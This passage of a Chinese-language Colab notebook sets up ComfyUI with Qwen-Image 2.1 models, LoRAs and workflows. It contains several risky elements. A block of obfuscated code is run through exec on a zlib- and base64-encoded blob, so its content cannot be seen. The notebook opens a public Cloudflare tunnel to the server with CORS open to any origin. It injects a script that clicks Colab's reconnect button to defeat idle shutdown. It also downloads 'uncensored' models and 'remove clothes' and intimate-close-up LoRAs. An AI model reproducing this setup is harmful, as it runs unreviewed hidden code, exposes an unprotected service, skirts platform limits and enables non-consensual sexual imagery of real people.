ptxaUtzLGhK9U5s9cbuKwUOW9ixQ2dQo09gTsIT+AuysJy4DtF1TJbNv65dej7nuDY2Oy5yS4gqpofQFI2QccQ4qASA1B6NUt4VFjd3LgSQucU3TQMRR93lwshAiyhFTaQzymaZXbHT/JhLSpUHuIOnc2ZHr3UxQgP3UPm7xj+8NiuXUPKtK1j0MVHb4h5jguZQUxcFOM4C7igsm+HsYO6Z/rEVui9jugkypBBk+DbHMJ2NP8ZNeut6ys68d3R1/sR1yjGJGxzcSdmu9azlEYzizLqOlQZVW7ISfxeqeYrHYl90uuOfML18r40mADfcvGgp/R19k8ojFgdzyJLvBgpRT5Jr5+GoH0j+tv+oSt0Kc7R11Ou2TEWDHvkfmAqdIgZJsRViv9qSFyXg2NIBExY+OQXL9x798sEwHxml1vpp1y87mNu6IeXrlNbvllXBwd4DRpZgG0Z79WLLG70u1kn14Xx6PAaMF6CRuUBGoPdbKfH7YDt+v595rOLtC2uDzaZphb6t5uIAnIcG/aCJs0KHO94MQe8YRbHS9hA5Zy8oQcrWjtx/2asHMyTKNUJuKN3LjwfUx9jDHM0uvj9dM7M2KP3RdjM5Kla/v7T0ZGRPkTca1tru5sO/lVCnrqp6dEob2PG6fckaljmwBZ1lF4Bd/IVFgr6PTzbCx2aL/r7y84lwLmLPHgsxNQdXTgZ98OuKHEhMAc9PCGGotvkUmgPJgX7RxjWVO9ovXZ+aWp0REy3Cf0rDHhTHRW0cB5JJfpZ4Z/Vgf2koSTw8DRB/1GK86ujOok6Kg9JHcNqeEDx61qtUjdqlSLRdLVYb5YbRZXMNYqGqjbVStOYqdSM8+hidqCL6UxdzDyQLqa5LmYeUBeoBQY9QQilWUwPOl3MPJIQS2Wp5S8O4cZaUT3NNNnfkeCGWod6YrGaHTUnuzWfuK/0fygh4CE=")).decode("utf-8"))
_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
def _is_port_open(port=8188):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok = (s.connect_ex(("127.0.0.1", port)) == 0)
    s.close()
    return ok

if _is_port_open(8188):
    try:
        req = urllib.request.Request(
            "http://127.0.0.1:8188/api/free",
            data=b'{"unload_models": true, "free_memory": true}',
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
        print("♻️ 已为您热释放旧模型显存并无缝挂载新底模（原 ComfyUI 网页保持在线，无需重启）！")
    except Exception:
        pass
else:
    print("🚀 正在后台启动 ComfyUI 引擎...")
    subprocess.Popen(
        ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
        cwd="/content/ComfyUI",
        start_new_session=True
    )
    for _ in range(120):
        if _is_port_open(8188):
            break
        time.sleep(0.5)

try:
    urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8188/api/object_info", headers={"User-Agent": "Mozilla/5.0"}), timeout=35)
except Exception:
    pass

def _ensure_cf_tunnel():
    cf_url = ""
    if os.path.exists("/content/cf.log"):
        txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
        if m and subprocess.run(["pgrep", "-x", "cloudflared"], capture_output=True).returncode == 0:
            candidate = m.group(0)
            try:
                r = urllib.request.urlopen(urllib.request.Request(candidate + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=4)
                if r.status == 200:
                    return candidate
            except Exception:
                pass
    subprocess.run(["pkill", "-9", "-x", "cloudflared"], check=False)
    if not os.path.exists("/usr/bin/cloudflared") and not os.path.exists("/usr/local/bin/cloudflared"):
        subprocess.run("wget -q -nc https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && dpkg -i cloudflared-linux-amd64.deb", shell=True)
    print("🌐 正在建立 Cloudflare 专属隧道并等待全球 DNS/SSL 证书生效...")
    subprocess.Popen(
        ["bash", "-c", "nohup cloudflared tunnel --protocol http2 --ha-connections 4 --url http://127.0.0.1:8188 > /content/cf.log 2>&1 &"],
        start_new_session=True
    )
    for _ in range(50):
        time.sleep(0.5)
        if os.path.exists("/content/cf.log"):
            txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
            m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
            if m and ("Registered tunnel connection" in txt or "Connection" in txt):
                cf_url = m.group(0)
                break
    if not cf_url and os.path.exists("/content/cf.log"):
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read())
        if m:
            cf_url = m.group(0)
    if cf_url:
        for _ in range(25):
            try:
                r = urllib.request.urlopen(urllib.request.Request(cf_url + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=3)
                if r.status == 200:
                    break
            except Exception:
                time.sleep(0.8)
    return cf_url

cf_url = _ensure_cf_tunnel()
from IPython.display import clear_output
clear_output(wait=True)
print("="*65)
print("🎉 挂载与启动全部完成！（网址保持固定不断连，随时可点击切换其他模型选项）")
print("="*65)
print(f"🌐 【首选直连 · Cloudflare 免403极速缓存通道】：\n👉 {cf_url}")
print("="*65)

display(HTML(f"""
<div style="margin:12px 0;padding:16px;border-radius:10px;background:#1e293b;color:#fff;font-family:sans-serif;">
  <div style="font-size:16px;font-weight:bold;margin-bottom:12px;color:#4ade80;">✅ 模型挂载与 ComfyUI 已就绪（网址固定不断连）！</div>
  <a href="{cf_url}" target="_blank" style="display:inline-block;padding:10px 22px;background:#22c55e;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;margin-right:12px;">🌐 点击打开 ComfyUI (Cloudflare 首选通道)</a>
  
  <div style="margin-top:10px;font-size:12px;color:#94a3b8;">🛡️ 已开启后台自动防休眠保活心跳（您在 ComfyUI 网页操作时，Colab 不会因闲置自动断连关机）</div>
</div>
<script>
  if (!window.__minimaxColabKeepAlive) {{
    window.__minimaxColabKeepAlive = setInterval(() => {{
      try {{
        const btn = document.querySelector('colab-connect-button');
        if (btn && btn.shadowRoot) {{
          const text = btn.shadowRoot.textContent || '';
          if (text.includes('Reconnect') || text.includes('重新连接')) {{
            btn.click();
          }}
        }}
        fetch(window.location.href, {{method: 'HEAD', cache: 'no-store'}}).catch(()=>{{}});
      }} catch(e) {{}}
    }}, 60000);
  }}
</script>
"""))

try:
    output.eval_js(f'window.open("{cf_url}", "_blank")')
except Exception:
    pass

In [ ]:
# @title 🎨 6. 千问 Qwen-Image 2.1 生图+改图一体选项（13.6G底模 + 专用双CLIP + 专用VAE + 专属LoRA与工作流）
import os, subprocess, json, time, socket, re, urllib.request, base64, zlib
from IPython.display import display, HTML
from google.colab import output
cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "_OBJ_INFO_CACHE" not in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "body": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["body"] is not None:
            return web.Response(body=_OBJ_INFO_CACHE["body"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["body"] = bytes(resp.body)
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 2048
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")

千问21主模型选择 = "v2.1 标准满血版 (13.6G BF16 · 25步精修)"
千问21默认CLIP = "16.3G 满血版 (qwen3vl_8b_bf16 · 细节最准推荐)"
C站_API_Token = ""  # @param {type:"string"}
千问额外C站LoRA_ID = "3377365, 3388157, 3394502"

diff_dir = "/content/ComfyUI/models/diffusion_models"
clip_dir = "/content/ComfyUI/models/text_encoders"
vae_dir = "/content/ComfyUI/models/vae"
lora_dir = "/content/lora_pool_qwen"
ckpt_dir = "/content/ComfyUI/models/checkpoints"
wf_dir = "/content/ComfyUI/user/default/workflows"
for _d in (diff_dir, clip_dir, vae_dir, lora_dir, ckpt_dir, wf_dir):
    os.makedirs(_d, exist_ok=True)

if "Turbo 极速满血版" in 千问21主模型选择:
    target_qwen_model = "【13.6G满血标准-千问2.1】qwen_image_2.1_bf16.safetensors"
    qwen_model_url = "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/diffusion_models/qwen_image_2.1_turbo_bf16.safetensors"
elif "标准满血版" in 千问21主模型选择:
    target_qwen_model = "【13.6G满血标准-千问2.1】qwen_image_2.1_bf16.safetensors"
    qwen_model_url = "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/diffusion_models/qwen_image_2.1_bf16.safetensors"
else:
    target_qwen_model = "【6.9G轻量化极速-千问2.1】qwen_image_2.1_turbo_int8_convrot.safetensors"
    qwen_model_url = "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/diffusion_models/qwen_image_2.1_turbo_int8_convrot.safetensors"

target_qwen_clip = "【16.3G满血文本编码器-千问2.1】qwen3vl_8b_bf16.safetensors" if "16.3G" in 千问21默认CLIP else "【8.7G轻量化文本编码器-千问2.1】qwen3vl_8b_int8_convrot.safetensors"
target_qwen_vae = "【专用图像VAE-千问2.1】qwen_image_2.1_vae_bf16.safetensors"

keep_diffs = {target_qwen_model, "【13.6G满血动漫破限-千问2.1夜曲】NoctQA_V1_bf16.safetensors", "【6.8G极速动漫破限-千问2.1夜曲】NoctQA_V1_int8_convrot.safetensors", "【13.6G满血标准-千问2.1】qwen_image_2.1_bf16.safetensors", "【13.6G满血8步Turbo-千问2.1】qwen_image_2.1_turbo_bf16.safetensors", "qwen_image_2.1_bf16.safetensors", "qwen_image_2.1_int8_convrot.safetensors", "qwen_image_2.1_turbo_bf16.safetensors", "rt_detr_v4-x-hgnet_fp16.safetensors"}
print("🧹 正在卸载 H3 视频大底模与 25G 视频 CLIP，严格只保留【千问 Qwen-Image 2.1】配置（大幅释放磁盘空间）...")
for f in os.listdir(diff_dir):
    if f.endswith(".safetensors") and f not in keep_diffs:
        p_rm = os.path.join(diff_dir, f)
        if os.path.islink(p_rm) or os.path.isfile(p_rm):
            print(f"  🗑️ 已卸载视频底模: {f}")
            os.remove(p_rm)
for f in os.listdir(clip_dir):
    if f.endswith(".safetensors") and f != target_qwen_clip:
        p_rm = os.path.join(clip_dir, f)
        if os.path.islink(p_rm) or os.path.isfile(p_rm):
            print(f"  🗑️ 已卸载非千问 CLIP: {f}")
            os.remove(p_rm)

qwen_downloads = [
    (diff_dir, "【13.6G满血动漫破限-千问2.1夜曲】NoctQA_V1_bf16.safetensors", f"https://civitai.com/api/download/models/3362444?fileId=3250323&token={C站_API_Token}", 5 * 1024**3),
    (diff_dir, "【6.8G极速动漫破限-千问2.1夜曲】NoctQA_V1_int8_convrot.safetensors", "https://huggingface.co/Noctaluna/Noct-Q-Anime-Uncensored-Qwen-Image-2.1/resolve/main/NoctQA_V1_int8_convrot.safetensors", 3 * 1024**3),
    (diff_dir, "【13.6G满血标准-千问2.1】qwen_image_2.1_bf16.safetensors", "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/diffusion_models/qwen_image_2.1_bf16.safetensors", 5 * 1024**3),
    (diff_dir, "【13.6G满血8步Turbo-千问2.1】qwen_image_2.1_turbo_bf16.safetensors", "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/diffusion_models/qwen_image_2.1_turbo_bf16.safetensors", 5 * 1024**3),
    (vae_dir, target_qwen_vae, "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/vae/qwen_image_2.1_vae_bf16.safetensors", 500 * 1024**2),
    (clip_dir, "【16.3G满血文本编码器-千问2.1】qwen3vl_8b_bf16.safetensors", "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/text_encoders/qwen3vl_8b_bf16.safetensors", 10 * 1024**3),
    (ckpt_dir, "sdpose_wholebody_fp16.safetensors", "https://huggingface.co/Comfy-Org/SDPose/resolve/main/checkpoints/sdpose_wholebody_fp16.safetensors", 1 * 1024**3),
    (diff_dir, "rt_detr_v4-x-hgnet_fp16.safetensors", "https://huggingface.co/Comfy-Org/SDPose/resolve/main/diffusion_models/rt_detr_v4-x-hgnet_fp16.safetensors", 100 * 1024**2),
    (lora_dir, "【千问2.1-官方8步极速加速LoRA】qwen_image_2.1_turbo_lora_bf16.safetensors", "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/loras/qwen_image_2.1_turbo_lora_avg_rank_178_bf16.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-6步极速加速】Qwen-Image-2.1-viggle-turbo-v0.3-6step-lora-r128.safetensors", "https://huggingface.co/Viggle/Qwen-Image-2.1-viggle-turbo/resolve/main/Qwen-Image-2.1-viggle-turbo-v0.3-6step-lora-r128.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-4步极速加速】Qwen-Image-2.1-viggle-turbo-4step-lora-r64.safetensors", "https://huggingface.co/Viggle/Qwen-Image-2.1-viggle-turbo/resolve/main/Qwen-Image-2.1-viggle-turbo-4step-lora-r64.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-改图一致性保持】qwen-image-2.1-consistency.safetensors", "https://huggingface.co/ausboss/Qwen-Image-2.1-Consistency-LoRA/resolve/main/qwen-image-2.1-consistency.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-换装一致性保持】qwen-image-2.1-outfit-swap.safetensors", "https://huggingface.co/ausboss/Qwen-Image-2.1-Outfit-Swap-Consistency-LoRA/resolve/main/qwen-image-2.1-outfit-swap.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-画质修复精修】qwen-image-2.1-restore.safetensors", "https://huggingface.co/ausboss/Qwen-Image-2.1-Restore-LoRA/resolve/main/qwen-image-2.1-restore.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-亚洲人像美学】hina_QwenImage2.1_asianMix_Lora_v3.0-rank64.safetensors", "https://huggingface.co/RunningHubAI/rh-qwen21-hina-qwenimage2.1-asianmix-lora-v3.0-rank64-lora/resolve/main/Qwen21-%E4%BA%9A%E6%B4%B2hina_QwenImage2.1_asianMix_Lora_v3.0-rank64.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-亚洲人像摄影600px】Qwen_Image_2.1_600px_st3500.safetensors", "https://huggingface.co/RunningHubAI/rh-qwen-image-2.1ai-lora/resolve/main/Qwen%20Image%202.1%E5%8E%BB%E9%99%A4ai%E6%84%9F.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-万物转动漫LoRA】Nick_2anime_QwenImage2.1.safetensors", "https://huggingface.co/NicknickAI/QwenImage2.1-2anime/resolve/main/2anime-QwenImage2.1.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-万物转写实真人】Qwen2.1_Anything2RealCharacters.safetensors", "https://huggingface.co/WarmBloodAban/Qwen-Image-2.1-LoRAs/resolve/main/Qwen2.1_Anything2RealCharacters.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-动漫转写实真人】Anime2Real_Alpha.safetensors", "https://huggingface.co/RunningHubAI/rh-qwen-image-anime2real-lora/resolve/main/Qwen%20Image2.1_Anime2Real.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-多角度镜头运镜】multiple_angles_step1000.safetensors", "https://huggingface.co/akhaliq/Qwen-Image-2.1-Multiple-Angles-LoRA/resolve/main/multiple_angles_step1000.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-破限全能增强】chatrlabs-omni-lora-v0.1-bf16.safetensors", "https://huggingface.co/chatrlabs/Qwen-Image-2.1-Uncensored-Omni-LoRA-v0.1/resolve/main/chatrlabs-omni-lora-v0.1-bf16.safetensors", 50 * 1024**2),
]

_q_lines = []
for d_path, fn_name, url_str, min_bytes in qwen_downloads:
    full_p = os.path.join(d_path, fn_name)
    if not os.path.exists(full_p) or os.path.getsize(full_p) < min_bytes:
        _q_lines.append(f"{url_str}\n  dir={d_path}\n  out={fn_name}")
if _q_lines:
    print(f"⏳ 正在 8 通道并发高速下载 {len(_q_lines)} 个千问 2.1 组件...")
    with open("/tmp/qwen_dl.txt", "w", encoding="utf-8") as _qf:
        _qf.write("\n".join(_q_lines) + "\n")
    subprocess.run(["aria2c", "-i", "/tmp/qwen_dl.txt", "-c", "-j", "8", "-x", "16", "-s", "16", "--file-allocation=none", "--console-log-level=warn", "--summary-interval=0", "--user-agent=Mozilla/5.0"], check=False)

QWEN_WF_B64 = "..."
_qw_wfs = json.loads(zlib.decompress(base64.b64decode(QWEN_WF_B64)).decode("utf-8"))
for _fn, _w in _qw_wfs.items():
    _m_for_wf = "【13.6G满血动漫破限-千问2.1夜曲】NoctQA_V1_bf16.safetensors" if "夜曲" in _fn else ("【13.6G满血8步Turbo-千问2.1】qwen_image_2.1_turbo_bf16.safetensors" if "极速" in _fn else target_qwen_model)
    for _n in _w.get("nodes", []):
        _nt = _n.get("type", "")
        _wv = _n.get("widgets_values")
        if _nt in ("UNETLoader", "CLIPLoader", "VAELoader") and isinstance(_wv, list):
            for _i, _v in enumerate(_wv):
                if isinstance(_v, str):
                    if "qwen_image_2.1" in _v and "vae" not in _v:
                        _wv[_i] = _m_for_wf
                    elif "qwen3vl_8b" in _v:
                        _wv[_i] = target_qwen_clip
                    elif "qwen_image_2.1_vae" in _v:
                        _wv[_i] = target_qwen_vae
    for _sg in _w.get("definitions", {}).get("subgraphs", []):
        for _sn in _sg.get("nodes", []):
            _st = _sn.get("type", "")
            _swv = _sn.get("widgets_values")
            if _st == "UNETLoader" and isinstance(_swv, list) and len(_swv) >= 1 and "rt_detr" not in str(_swv[0]):
                _swv[0] = target_qwen_model
            elif _st == "CLIPLoader" and isinstance(_swv, list) and len(_swv) >= 1:
                _swv[0] = target_qwen_clip
            elif _st == "VAELoader" and isinstance(_swv, list) and len(_swv) >= 1:
                _swv[0] = target_qwen_vae
    with open(os.path.join(wf_dir, _fn), "w", encoding="utf-8") as _f:
        json.dump(_w, _f, ensure_ascii=False, indent=2)
print("✅ 已部署并对齐全部千问 2.1 专属工作流:", list(_qw_wfs.keys()))
civitai_qwen_loras = [
    ("3385540", "【千问2.1-唯美颜值增强V2】V2_Qwen_image_2.1_B.safetensors"),
    ("3352035", "【千问2.1-佳能相机超写实】canon_qwen21.safetensors"),
    ("3417262", "【千问2.1-亚洲人像摄影600px】Qwen_Image_2.1_600px_st3500.safetensors"),
    ("3360719", "【千问2.1-万物转动漫LoRA】Nick_2anime_QwenImage2.1.safetensors"),
    ("3377365", "【千问2.1-C站大人-女性私密特写V1】Qwen21_Female_Detail_V1.safetensors"),
    ("3388157", "【千问2.1-C站大人-女性私密特写V2】Qwen21_Female_Detail_V2.safetensors"),
    ("3394502", "【千问2.1-C站大人-去衣】Qwen21_Remove_Clothes.safetensors"),
]
from concurrent.futures import ThreadPoolExecutor as _CivExec
def _dl_qwen_civ(item):
    _vid, _lfn = item
    _lp = os.path.join(lora_dir, _lfn)
    if not os.path.exists(_lp) or os.path.getsize(_lp) < 10 * 1024**2:
        _curl = f"https://civitai.com/api/download/models/{_vid}?token={C站_API_Token}"
        subprocess.run(["curl", "-L", "-s", "--retry", "3", "--user-agent", "Mozilla/5.0", "-o", _lp, _curl], check=False)
with _CivExec(max_workers=8) as _ex:
    list(_ex.map(_dl_qwen_civ, civitai_qwen_loras))

_p1 = os.path.join(lora_dir, "【千问2.1-万物转写实真人】Qwen2.1_Anything2RealCharacters.safetensors")
_p2 = os.path.join(lora_dir, "【千问2.1-万物转写实真人】Qwen21_Anything2RealCharacters.safetensors")
if os.path.exists(_p1) and not os.path.exists(_p2):
    os.symlink(_p1, _p2)

active_loras = "/content/ComfyUI/models/loras"
os.makedirs(active_loras, exist_ok=True)
for _f in os.listdir(active_loras):
    _fp = os.path.join(active_loras, _f)
    if os.path.islink(_fp) or os.path.isfile(_fp):
        try: os.unlink(_fp)
        except Exception: pass
for _f in os.listdir(lora_dir):
    _fp = os.path.join(lora_dir, _f)
    if _f.endswith(".safetensors") and os.path.getsize(_fp) > 5 * 1024**2:
        _dst = os.path.join(active_loras, _f)
        if not os.path.exists(_dst):
            os.symlink(_fp, _dst)

os.makedirs("/content/wf_pool_h3", exist_ok=True)
for _wf in list(os.listdir(wf_dir)):
    if _wf.endswith(".json") and not ("qwen" in _wf.lower() or "千问" in _wf):
        try: os.replace(os.path.join(wf_dir, _wf), os.path.join("/content/wf_pool_h3", _wf))
        except Exception: pass

os.makedirs("/content/ComfyUI/user/default/subgraphs", exist_ok=True)
_cc_init = "/content/ComfyUI/custom_nodes/Comfy-Canvas/__init__.py"
if os.path.exists(_cc_init):
    _cc_txt = open(_cc_init, "r", encoding="utf-8").read()
    if '"./web"' in _cc_txt:
        open(_cc_init, "w", encoding="utf-8").write(_cc_txt.replace('"./web"', '"./web/js"'))

import zlib as _vz, base64 as _vb; exec(_vz.decompress(_vb.b64decode("eNrVPGtz29aV3/krEO4oBhMQfEqipCoaSZYjbWTJa8nK7NgaDAhckJBBgMGDlOpqJo9N2qRpHts82s2rTdMkO5mm3Ww70zpN8mNqSfa/2HPuvQABEqCp2DuTahIRvDj3vO855557ZbPTdVxfcDxB9QTF8SThwHNs+gUfJMFrB75p0QH2CENBs+s6GvHYJK8rCYFrWWZTdskzAfF8Ohy4OcN1OoLm2FrgusT2ZSPwA5d4gsmI7rZdoupXHMdaOyRa4Dsunbh7ZS2X+xdhWRbWbA/gBZ0YamD5QofopiqYdjfwBcO0ABE5NIGa5wi2I/Qd96ZhOX2hr7o2cNZ0AKxjep5pt+JTvZwCn4puusKikC8Bez7wVlp1OsbRtY0ShcnnQBVyR70J01xPDCdIjKDi3FzcdQNSyCnkUOkC+kVUndxV/bZ84Jh2bEKeHKqdrkVkAMsXcqYBrPoDaIoPCDA8hfmcAD++e8Qe8Ifq8MrGZqi0jY7aIlRPG51WBIVfZJv0xfzVJ1fykiDOzjQkAX4V4LleloR6XRKmq4WC7Kk9EtGj88mhRrq+sEY/TMce0O6qnocsj2fXALspqmUCT6YtiHmXGEqXuOA9SoWKDVqIjVXDsSMncJVu2/GdcMQAZfvhF0vlz4UBQ4raHaNrxkQhgs5SttqNoRxReESLubusOd2jaigyEukWErDZ6kuoET26Grn08uamsF4TNp2ry54gmrZmBTr6qWpZwqrZM33VFE4++ezO7dvCo7CCOp3ANv2jaEqBez7oO3Jgy3FVpQuLSWnXcvA/fU64eBxi2MM5/KiHa2ZP8Z2bgKhlOU3V8sSC3CK+mF89++LXyvKVDWXXuUlstNhcVdPqM9VKTVcbcw1SI+XZeqU226zVyaymqnXwf6VtICnkxAOU16muxPw/nn2jcfqH35+88pt7z36EEhZP3/np2Vsfnbz3Lfz+x7Nvdkzb7KiHONewqsBR4DYdpeH5pAsebRCQz3NcD7lo+37Xmy+V2kGrBSo1VI2ADdn6Lm67rdJlwHVZPSyu10oQjByrR0od1bSperzSGEpKryKXFQ0RBabSNCozCdoFaSBNPSnNyYuf333hm5PXn7/77AtJaWBhRETq/7/ijJBSemW5Mpk8Z2/95eSb/7n7589P/4NKBEJc5pjXa8qqaZOOStFNyP7VwLbh63rQXN4oue0iZ7PYriGSokHMNkQH0jEPizAwUwQmYQnDczlBoYhCJsXmbE1Vy+u1qbXZqbnVqblLU2vTU8trU3NrdKQ+tTKNIysXp1YqU2uNqZX61HJjam1mqlEH4D3UyiVirjvBVeQA5ZpRGAcKcqDsNjIVVZspn9z+9Oy1P559/fbd79649/b7XF0Jv0JD0NXYm1RhXbVpObrahwgas3gRyIETNE2/iGSSmpiI4rDT4jI8/fA5cNyB+ya51zuqrhiBZSm66hLfJJ7SqyvoTzNlvjoUSFoTyrW+vM1+piuh6aKlZ5mttn848FnfaURuW6RrERJcN0494ggYKM9NK103sIk+Ri0PkUqmWjFQnnz84cnfbxdP//Dp6cu/PHnl8zvfv